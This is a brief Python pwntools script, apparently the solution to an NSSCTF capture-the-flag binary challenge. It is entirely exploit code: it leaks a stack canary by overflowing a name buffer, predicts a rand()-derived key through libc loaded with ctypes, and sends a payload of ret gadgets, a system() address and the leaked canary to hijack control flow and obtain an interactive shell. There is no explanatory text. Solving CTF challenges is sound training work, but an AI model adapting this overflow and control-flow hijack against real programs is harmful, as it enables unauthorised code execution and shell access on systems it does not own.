from pwn import *
from ctypes import *

io = process("./pwn")
# io = remote("node4.anna.nssctf.cn", 27550)
clib = cdll.LoadLibrary("/usr/lib/libc.so.6")

key = clib.rand() % 1000 + 324
ret = 0x4005D9
system = 0x4007C7

payload0 = b"a" * (0x30 - 0x8)

io.recvuntil(b"name\n")
io.sendline(payload0)
io.recvuntil(b"a\n")
canary = u64(io.recv(7).rjust(8, b"\x00"))

print("canary =", hex(canary))

io.recvuntil(b"key\n")
io.send(p32(int(key)))

io.recvuntil(b"make a wish to me")
payload1 = p64(ret) * 10 + p64(system) + p64(canary)
print(hex(len(payload1)))
#gdb.attach(io)
io.send(payload1)

io.interactive()
